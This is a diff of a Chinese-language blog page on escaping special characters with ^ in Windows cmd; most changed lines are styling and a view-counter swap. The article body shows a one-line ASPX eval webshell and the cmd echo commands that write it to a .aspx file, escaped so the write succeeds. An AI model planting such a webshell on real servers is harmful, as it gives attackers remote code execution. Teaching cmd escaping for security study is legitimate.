@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501021138837.png">
 <meta property="og:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501020902290.png">
 <meta property="article:published_time" content="2022-04-30T16:58:00.000Z">
-<meta property="article:modified_time" content="2022-04-30T18:19:11.807Z">
+<meta property="article:modified_time" content="2022-04-30T18:35:06.182Z">
 <meta property="article:author" content="Nan-911">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501021104787.png">
@@ -59,6 +59,11 @@
 
 <link  rel="stylesheet" href="/css/main.css" />
 
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
 
 
 
@@ -239,9 +244,9 @@
     
     
       
-        <span id="busuanzi_container_page_pv" style="display: none">
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
           <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> 次
+          <span id="leancloud-page-views"></span> 次
         </span>
         
       
@@ -285,21 +290,21 @@
 <h1 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符^"></a>转义字符^</h1><p><strong>用在特殊符号之前，取消特殊字符的作用。</strong></p>
 <p><strong>一般而言，^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功能，如果需要把它们作为字符输出的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符^，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^^……之类的格式来处理；</strong></p>
 <p><strong>正常webshell：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">&lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt;&lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure>
 
 <p>如果使用cmd写入webshell，如果不进行转义的话则是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt; &gt; C:\Users\Anonymous\Desktop\test.aspx</span><br></pre></td></tr></table></figure>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">echo &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt;&lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt; &gt; C:\Users\Anonymous\Desktop\test.aspx<br></code></pre></td></tr></table></figure>
 
 <p>使用上面语句写入shell会报错：</p>
 <p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501021104787.png" srcset="/img/loading.gif" lazyload></p>
 <p>进行转义后则写入成功：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\Users\Anonymous\Desktop\test.aspx</span><br></pre></td></tr></table></figure>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">echo ^&lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%^&gt;^&lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%^&gt; &gt; C:\Users\Anonymous\Desktop\test.aspx<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501021138837.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>&gt; 定向符</strong><br>将输出的内容重定向到指定(文本中)<br>比如<br>echo 123456789 &gt; 1.txt<br>输出字符串到1.txt中</p>
 <p><strong>&gt;&gt; 定向符(追加)</strong><br>将输出内容写入指定(文本中)<br>注意<code>&gt;</code>将覆盖文本中原有内容<code>&gt;&gt;</code> 则是在文本的最后添加内容<code>&gt;&gt;</code>追加内容时，会先换行再追加内容。</p>
 <p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 123 &gt; 1.txt</span><br><span class="line">echo 456 &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic">echo <span class="hljs-number">123</span> &gt; <span class="hljs-number">1</span>.txt<br>echo <span class="hljs-number">456</span> &gt;&gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
 
 <p>文本中有两行分别是123和456<br>如果<code>echo 456 &gt; 1.txt</code><br>那么原有文本中的所有内容将会被覆盖掉变成456</p>
 <p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/image-20220501020902290.png" srcset="/img/loading.gif" lazyload></p>
@@ -430,6 +435,9 @@
 
 
 
+
+
+  
 
 
 
@@ -722,8 +730,6 @@
   <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
   <script defer src="/js/leancloud.js" ></script>
 
